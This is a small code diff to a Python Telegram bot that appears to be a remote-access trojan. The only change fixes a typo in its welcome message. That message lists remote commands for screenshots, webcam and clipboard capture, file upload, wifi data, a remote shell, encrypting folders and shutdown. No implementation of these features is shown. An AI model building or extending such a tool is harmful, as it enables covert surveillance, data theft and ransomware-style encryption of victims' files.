@@ -22,7 +22,7 @@ bot.set_webhook()
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    bot.send_message(message.chat.id, 'Welcome! Send /screen to capture screenshot.\n/sys to get system information.\/ip to get ip adress.\n/cd to navigate in folders. /ls for list élements. \n/upload [path] to get file.\n/crypt [path] for crypt folders files. /decrypt [path] \n/webcam /lock \n /clipoard /shell /wifi /speech [hi] \n/shutdown  ')
+    bot.send_message(message.chat.id, 'Welcome! Send /screen to capture screenshot.\n/sys to get system information.\/ip to get ip adress.\n/cd to navigate in folders. /ls for list élements. \n/upload [path] to get file.\n/crypt [path] for crypt folders files. /decrypt [path] \n/webcam /lock \n /clipboard /shell /wifi /speech [hi] \n/shutdown  ')
 
 @bot.message_handler(commands=['screen'])
 def send_screen(message):
